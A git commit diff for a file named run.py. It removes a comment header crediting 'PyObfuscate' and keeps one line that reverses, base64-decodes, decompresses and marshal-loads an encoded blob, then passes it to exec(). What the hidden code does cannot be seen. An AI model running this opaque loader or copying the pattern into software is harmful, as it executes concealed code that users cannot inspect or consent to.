c7128e998ab9467c21def1f481b8fd85363fc36e
UNKNOWN USER <121691772+NIKHILBABE@users.noreply.github.com>
2023-03-08 15:24:15 +0545

    Update run.py

--- run.py
+++ run.py
@@ -1,5 +1,1 @@
-# Obfuscated with PyObfuscate
-# https://www.github.com/htr-tech
-# Time : Wed Mar  8 15:20:57 2023
-# -------------------------------
 _ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'=QoZH1GACoFBirCGFw+gKYfQROXJAzb4qBGbgDW3YDjLsjxV2xwibnHU82AvtwbjG2BXtwSDcxwGtbQB2PoC7HUk1ZKw9CWbgBm3FEwrBOIeIjMzAjPkCE3QDIg9NQ8VqNpmS95mTGWx7Dbq2Km/XAyzGqk7qlUclF3WWAet1cCO1uocXlJlQpVx92EzJniYffR5x8WW0UL9St4ESO1i0Th0LSXFypIBrqdwc0TnqEIHDxBXVwP/dzRFcwbFc0fPcwTFDyhI9zTfmAAEo6+5ozOHkYBpUQdvkKR+Y/s5fogfOGmCh6oTK4jne4tn+pg/B5fEK4v3K4pL+5YQKIpAVtS8ELh9JDKzYI8nuoYxXLQxQqsIBHmSnF5YwQqM0FsZyoIAkFWaEaGrwITMWipUZKFGZixoZEaBQMMmCDpwQ6MmQOxc6DFzCAkZLxJe'))
